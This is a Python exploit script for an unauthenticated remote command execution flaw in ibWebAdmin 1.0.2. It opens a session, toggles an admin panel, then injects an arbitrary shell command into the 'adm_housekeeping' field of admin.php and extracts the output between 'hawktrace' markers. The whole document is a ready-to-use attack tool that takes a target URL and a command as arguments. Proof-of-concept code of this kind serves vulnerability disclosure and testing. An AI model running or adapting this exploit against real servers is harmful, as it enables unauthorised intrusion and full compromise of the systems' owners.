#!/usr/bin/env python3

import requests
import sys
import re
import argparse

def init_session(target):
    session = requests.Session()

    try:
        response = session.get(f"{target}/database.php", timeout=30, allow_redirects=True)
        if response.status_code == 200:
            cookies = session.cookies.get_dict()
            if cookies:
                cookie_name = list(cookies.keys())[0]
                print(f"[+] Session: {cookies[cookie_name]}")
                return session
    except Exception as e:
        print(f"[-] Session init error: {e}")
    return None

def open_gfix_panel(target, session):
    try:
        response = session.get(f"{target}/toggle_fold_panel.php", params={'a': 'admin', 'p': '3', 'd': 'open'}, timeout=30, allow_redirects=False)
        if response.status_code == 302:
            return True
        elif response.status_code == 200:
            return True
    except Exception as e:
        print(f"[-] Panel toggle error: {e}")
    return False

def execute_command(target, session, cmd):
    marker = 'hawktrace'
    payload = f";echo {marker};{cmd};echo {marker};"

    data = {
        'adm_gfix_housekeeping': '1',
        'adm_housekeeping': payload
    }

    try:
        response = session.post(f"{target}/admin.php", data=data, timeout=30)
        if response.status_code == 200:
            return parse_output(response.text)
    except Exception as e:
        print(f"[-] Exec error: {e}")
    return None

def parse_output(body):
    marker = 'hawktrace'
    start = body.find(marker)
    if start == -1:
        return None
    start += len(marker)
    end = body.find(marker, start)
    if end == -1:
        return None
    output = body[start:end]
    output = re.sub(r'<[^>]+>', '', output)
    return output.strip()

def main():
    parser = argparse.ArgumentParser(description='ibWebAdmin 1.0.2 Unauth RCE')
    parser.add_argument('--url', required=True, help='Target URL (e.g. http://192.168.1.100:9999)')
    parser.add_argument('--cmd', default='id', help='Command to execute (default: id)')
    args = parser.parse_args()

    target = args.url.rstrip('/')
    cmd = args.cmd

    print(r"""

 _                    _    _
| |                  | |  | |
| |__   __ ___      _| | _| |_ _ __ __ _  ___ ___
| '_ \ / _` \ \ /\ / / |/ / __| '__/ _` |/ __/ _ \
| | | | (_| |\ V  V /|   <| |_| | | (_| | (_|  __/
|_| |_|\__,_| \_/\_/ |_|\_\\__|_|  \__,_|\___\___|

              Batuhan Er @int20z
             ibWebAdmin Unauth RCE

""")

    print(f"[*] Target: {target}")
    print(f"[*] Command: {cmd}")
    print()

    print("[+] Initializing session...")
    session = init_session(target)
    if not session:
        print("[-] Failed to get session")
        return

    if not open_gfix_panel(target, session):
        print("[-] Failed to open panel")
        return

    print("[+] Sending command...")
    output = execute_command(target, session, cmd)
    if output:
        print(f"[+] SUCCESS!")
        print()
        print(output)
    else:
        print("[-] No output received")

if __name__ == "__main__":
    main()
